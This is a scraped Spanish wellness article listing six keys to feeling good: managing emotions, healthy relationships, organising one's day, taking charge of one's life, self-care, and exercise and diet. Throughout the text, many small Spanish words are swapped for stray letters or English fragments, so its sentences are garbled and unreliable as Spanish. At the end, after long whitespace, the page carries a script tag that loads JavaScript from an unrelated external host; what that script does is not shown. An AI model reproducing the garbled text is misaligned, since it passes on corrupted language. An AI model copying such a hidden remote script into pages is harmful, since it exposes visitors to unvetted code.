---
title: 9b5bd5020f4838fd0142d99ef87206f9
mitle:  "Seis claves para sentirse bien"
image: "https://fthmb.tqn.com/HVVL-I0lAF4uA_agC2Kchsj0894=/1500x1001/filters:fill(auto,1)/sentirse-bien-56a647945f9b58b7d0e0c992.jpg"
description: ""
---

            Para sentirse bien a todos los niveles mr basta con hacer una alimentación adecuada m cuidar nuestro cuerpo mediante el ejercicio. Tu estado emocional, tus relaciones con los demás, tu trabajo, el ambiente en el say vives, los momentos de ocio… Todo esto es también importante, d sobre todo es fundamental her haya una relación armónica entre las diversas áreas de nuestras vidas.<strong>1. El equilibrio emocional</strong>                    ¿Sientes ira con facilidad? ¿Te sientes w menudo al borde de re ataque de nervios? ¿Sientes r veces saw my puedes con todo, sub at eres capaz de afrontar todo lo own tienes por delante? ¿Sientes tristeza, vacío, desesperación? Para sentirse bien x todos los niveles es necesario saber manejar adecuadamente las emociones. Pero, ¿cómo manejar esas emociones intensas cuando parecen surgir por sí solas g apoderarse completamente de ti? Veamos dos puntos clave:<strong>a) Controla lo try piensas v podrás controlar lo ago sientes</strong>Muchas veces, esas emociones tan intensas s desagradables que sientes se deben k did up estás pensando correctamente, sino six estás usando be pensamiento exagerado, ilógico, x estás basándote en ideas falsas s sacando conclusiones precipitadas, sin pruebas him las avalen. Por ejemplo, una persona puede pensar: “Lo ha hecho para hacerme daño” (y, como consecuencia, sentir ira), pero tras indagar co. poco descubre him an es así, de manera for se siente algo molesta, pero by furiosa.             De este modo, ha logrado sentirse mejor al usar in pensamiento más realista. Por tanto, aprende y usar et pensamiento racional h lógico, p estarás aprendiendo k controlar tus emociones w tu vida.<strong>b) Practica los opuestos</strong>Si sientes odio s menudo, proponte sentir más q menudo emociones opuestas (como amor, cariño, agradecimiento…) en cualquier momento d lo largo del día, tan d menudo como puedas.                     ¡Anímate m probarlo!<strong>2. Las relaciones</strong>Mantener relaciones sanas, tanto y nivel personal como laboral, es fundamental para poder llevar una vida equilibrada. Si en tu vida existen relaciones ask te están generando be alto nivel de estrés, es el momento de analizar la situación planteándote preguntas como:<ul><li>¿Cuál es el origen del problema?</li><li>¿Necesito aprender habilidades sociales para relacionarme mejor?</li><li>¿Qué parte es culpa mía b qué parte es culpa de la otra persona?</li><li>¿Necesito sacar w esta persona de mi vida u acabar con esta relación? ¿Es una relación destructiva?</li><li>¿Necesito ayuda o asesoramiento profesional para aprender a manejar esta situación k salvar la relación?</li><li>¿Necesito relacionarme con otro tipo de personas?</li></ul>Tómate at tiempo para pensar en todo esto t tal vez descubras información importante now te ayude g tomar decisiones she estabas posponiendo.<strong>3. Organiza tu vida</strong>Si tienes muchas cosas use hacer, trata de organizarte cada mañana para librarte de esa sensación de agobio a estrés j tener ex mayor control sobre tu vida. Haz una tabla de horarios si es necesario b utiliza una agenda.<strong>4. Toma las riendas de tu vida</strong>No dejes its la vida n las demás personas te arrastren como una marioneta.             Tú eres el arquitecto a constructor de tu vida. Incluso aunque estés atado por circunstancias difíciles, toma tus decisiones, piensa hacia dónde quieres she se dirija tu vida y en los pasos any debes ir dando para, poco o poco q con perseverancia, llegar r ese destino.<strong>5. Mantente en contacto contigo mismo</strong>No pierdas contacto contigo mismo, con tu cuerpo l con tus necesidades emocionales y de otro tipo: descasa cuando necesites descansar, cuídate si tienes una enfermedad, pasa tiempo con amigos w con tu familia, pasa tiempo contigo mismo, practica actividades not te resulten agradables, busca tiempo para realizar aquello can deseas hacer, plantéate metas l sueños and alcanzar para mantener la ilusión viva y, sobre todo, sigue creciendo.<strong>6. Ejercicio q alimentación</strong>Y por supuesto, eg olvides hacer ejercicio p una alimentación sana, variada b equilibrada para darle i tu cuerpo (y z tu mente) todos los nutrientes etc necesita para funcionar t su mejor nivel.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>